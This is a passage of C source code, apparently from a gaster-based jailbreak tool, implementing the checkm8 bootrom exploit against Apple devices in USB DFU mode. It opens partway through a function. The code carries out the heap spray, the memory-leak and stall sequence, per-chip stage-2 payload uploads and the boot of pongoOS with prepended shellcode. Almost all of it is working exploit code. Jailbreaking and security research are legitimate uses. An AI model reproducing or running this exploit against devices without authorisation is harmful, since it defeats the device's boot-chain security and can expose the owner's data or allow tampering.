	send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
	return false;
}

static bool
checkm8_stage_setup(const usb_handle_t *handle) {
	unsigned usb_abort_timeout = usb_timeout - 1;
	transfer_ret_t transfer_ret;

	for(;;) {
		if(send_usb_control_request_async_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SZ, usb_abort_timeout, &transfer_ret) && transfer_ret.sz < config_overwrite_pad && send_usb_control_request_no_data(handle, 0, 0, 0, 0, config_overwrite_pad - transfer_ret.sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
			return true;
		}
		send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, NULL);
		usb_abort_timeout = (usb_abort_timeout + 1) % (usb_timeout - usb_abort_timeout_min + 1) + usb_abort_timeout_min;
	}
	return false;
}

static bool
checkm8_usb_request_leak(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, 1, &transfer_ret) && transfer_ret.sz == 0;
}

static void
checkm8_stall(const usb_handle_t *handle) {
	unsigned usb_abort_timeout = usb_timeout - 1;
	transfer_ret_t transfer_ret;

	for(;;) {
		if(send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ, usb_abort_timeout, &transfer_ret) && transfer_ret.sz < 3 * EP0_MAX_PACKET_SZ && checkm8_usb_request_leak(handle)) {
			break;
		}
		usb_abort_timeout = (usb_abort_timeout + 1) % (usb_timeout - usb_abort_timeout_min + 1) + usb_abort_timeout_min;
	}
}

static bool
checkm8_no_leak(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ + 1, 1, &transfer_ret) && transfer_ret.sz == 0;
}

static bool
checkm8_usb_request_stall(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL;
}

static bool
checkm8_stage_spray(const usb_handle_t *handle) {
	size_t i;

	if(config_large_leak == 0) {
		if(cpid == 0x7001 || cpid == 0x7000 || cpid == 0x7002 || cpid == 0x8003 || cpid == 0x8000) {
			while(!checkm8_usb_request_stall(handle) || !checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
		} else {
			checkm8_stall(handle);
			for(i = 0; i < config_hole; ++i) {
				while(!checkm8_no_leak(handle)) {}
			}
			while(!checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
		}
		send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 3 * EP0_MAX_PACKET_SZ + 1, NULL);
	} else {
		for(i = 0; i < config_large_leak; ++i) {
			while(!checkm8_usb_request_stall(handle)) {}
		}
		send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
	}
	return true;
}

static bool
checkm8_stage_patch(const usb_handle_t *handle) {
	size_t i, data_sz, packet_sz;
	uint8_t *data;
	transfer_ret_t transfer_ret;
	bool ret = false;
	void* blank[DFU_MAX_TRANSFER_SZ];
	memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
	uint64_t* p = (uint64_t*)blank;
    p[5] = insecure_memory_base;
	switch (cpid) {
		case 0x8000:
			log_debug("setting up stage 2 for s8000");
			data = calloc(1, payloads_yolo_s8000_bin_len);
			data_sz = 0;
			memcpy(data, payloads_yolo_s8000_bin, payloads_yolo_s8000_bin_len);
			data_sz += payloads_yolo_s8000_bin_len;
			break;
		case 0x8001:
			log_debug("setting up stage 2 for s8001");
			data = calloc(1, payloads_yolo_s8001_bin_len);
			data_sz = 0;
			memcpy(data, payloads_yolo_s8001_bin, payloads_yolo_s8001_bin_len);
			data_sz += payloads_yolo_s8001_bin_len;
			break;
		case 0x8003:
			log_debug("setting up stage 2 for s8003");
			data = calloc(1, payloads_yolo_s8003_bin_len);
			data_sz = 0;
			memcpy(data, payloads_yolo_s8003_bin, payloads_yolo_s8003_bin_len);
			data_sz += payloads_yolo_s8003_bin_len;
			break;
		case 0x7000:
			log_debug("setting up stage 2 for t7000");
			data = calloc(1, payloads_yolo_t7000_bin_len);
			data_sz = 0;
			memcpy(data, payloads_yolo_t7000_bin, payloads_yolo_t7000_bin_len);
			data_sz += payloads_yolo_t7000_bin_len;
			break;
		case 0x7001:
			log_debug("setting up stage 2 for t7001");
			data = calloc(1, payloads_yolo_t7001_bin_len);
			data_sz = 0;
			memcpy(data, payloads_yolo_t7001_bin, payloads_yolo_t7001_bin_len);
			data_sz += payloads_yolo_t7001_bin_len;
			break;
		case 0x8010:
			log_debug("setting up stage 2 for t8010");
			data = calloc(1, payloads_yolo_t8010_bin_len);
			data_sz = 0;
			memcpy(data, payloads_yolo_t8010_bin, payloads_yolo_t8010_bin_len);
			data_sz += payloads_yolo_t8010_bin_len;
			break;
		case 0x8011:
			log_debug("setting up stage 2 for t8011");
			data = calloc(1, payloads_yolo_t8011_bin_len);
			data_sz = 0;
			memcpy(data, payloads_yolo_t8011_bin, payloads_yolo_t8011_bin_len);
			data_sz += payloads_yolo_t8011_bin_len;
			break;
		case 0x8015:
			log_debug("setting up stage 2 for t8015");
			data = calloc(1, payloads_yolo_t8015_bin_len);
			data_sz = 0;
			memcpy(data, payloads_yolo_t8015_bin, payloads_yolo_t8015_bin_len);
			data_sz += payloads_yolo_t8015_bin_len;
			break;
		default:
			LOG(LOG_ERROR, "unsupported cpid 0x%" PRIX32 "", cpid);
			return false;
	}
	if(checkm8_usb_request_stall(handle) && checkm8_usb_request_leak(handle)) {
		log_debug("successfully leaked data");
	} else {
		log_debug("failed to leak data");
		return false;
	}
	for(i = 0; i < 2; i++) {
		send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0, NULL);
	}
	if(p != NULL && send_usb_control_request(handle, 0x00, 0, 0, 0x00, p, 0x30, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
		ret = true;
		for(i = 0; ret && i < data_sz; i += packet_sz) {
			packet_sz = MIN(data_sz - i, DFU_MAX_TRANSFER_SZ);
			ret = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz, NULL);
		}
		send_usb_control_request_no_data(handle, 0x21, 4, 0, 0, 0, NULL);
	}
	free(data);
	return ret;
}

#include <lz4/lz4.h>
#include <lz4/lz4hc.h>

static void compress_pongo(void *out, size_t *out_len) {
	size_t len = payloads_Pongo_bin_len;
	size_t out_len_ = *out_len;
	*out_len = LZ4_compress_HC(payloads_Pongo_bin, out, len, out_len_, LZ4HC_CLEVEL_MAX);
}

static void checkm8_boot_pongo(usb_handle_t *handle) {
	transfer_ret_t transfer_ret;
	LOG(LOG_INFO, "Booting pongoOS");
	log_debug("Compressing pongoOS");
	log_debug("Appending shellcode to the top of pongoOS (512 bytes)");
	void *shellcode = malloc(512);
	memcpy(shellcode, payloads_shellcode_bin, payloads_shellcode_bin_len);
	size_t out_len = payloads_Pongo_bin_len;
	void *out = malloc(out_len);
	compress_pongo(out, &out_len);
	log_debug("Compressed pongoOS from %u to %zu bytes", payloads_Pongo_bin_len, out_len);
	void *tmp = malloc(out_len + 512);
	memcpy(tmp, shellcode, 512);
	memcpy(tmp + 512, out, out_len);
	free(out);
	out = tmp;
	out_len += 512;
	free(shellcode);
	log_debug("Setting the compressed size into the shellcode");
	uint32_t* size = (uint32_t*)(out + 0x1fc);
	log_debug("size = 0x%" PRIX32 "", *size);
	*size = out_len - 512;
	log_debug("size = 0x%" PRIX32 "", *size);
	log_debug("Reconnecting to device");
	init_usb_handle(handle, APPLE_VID, DFU_MODE_PID);
	log_debug("Waiting for device to be ready");
	wait_usb_handle(handle, NULL, NULL);
	{
        size_t len = 0;
        size_t size;
        while(len < out_len)
        {
        retry:
            size = ((out_len - len) > 0x800) ? 0x800 : (out_len - len);
            send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, (unsigned char*)&out[len], size, &transfer_ret);
            if(transfer_ret.sz != size || transfer_ret.ret != USB_TRANSFER_OK)
            {
				log_debug("retrying at len = %zu", len);
                sleep_ms(100);
                goto retry;
            }
            len += size;
			log_debug("len = %zu", len);
        }
	}
	send_usb_control_request_no_data(handle, 0x21, 4, 0, 0, 0, NULL);
	log_debug("pongoOS sent, should be booting");
}

static bool
gaster_checkm8(usb_handle_t *handle) {
	enum {
		STAGE_RESET,
		STAGE_SETUP,
		STAGE_SPRAY,
		STAGE_PATCH,
		STAGE_PWNED
	} stage = STAGE_RESET;
	bool ret, pwned;

	init_usb_handle(handle, APPLE_VID, DFU_MODE_PID);
	while(stage != STAGE_PWNED && wait_usb_handle(handle, checkm8_check_usb_device, &pwned)) {
		if(!pwned) {
			if(stage == STAGE_RESET) {
				ret = checkm8_stage_reset(handle);
				stage = STAGE_SETUP;
			} else if(stage == STAGE_SETUP) {
    			LOG(LOG_INFO, "Setting up the exploit (this is the heap spray)");
				ret = checkm8_stage_setup(handle);
				stage = STAGE_SPRAY;
			} else if(stage == STAGE_SPRAY) {
				ret = checkm8_stage_spray(handle);
				stage = STAGE_PATCH;
			} else {
				LOG(LOG_INFO, "Right before trigger (this is the real bug setup)");
				ret = checkm8_stage_patch(handle);
				stage = STAGE_RESET;
			}
			if(ret) {
				log_debug("Stage %d succeeded", stage);
			} else {
				LOG(LOG_ERROR, "Stage %d failed", stage);
				stage = STAGE_RESET;
			}
			reset_usb_handle(handle);
		} else {
			stage = STAGE_PWNED;
		}
		close_usb_handle(handle);
	}
	return stage == STAGE_PWNED;
}

int exec_checkm8(void) {
	usb_handle_t handle;
	usb_timeout = 5;
	usb_abort_timeout_min = 0;
	gaster_checkm8(&handle);
	sleep_ms(3000);
	checkm8_boot_pongo(&handle);
	return 0;
}
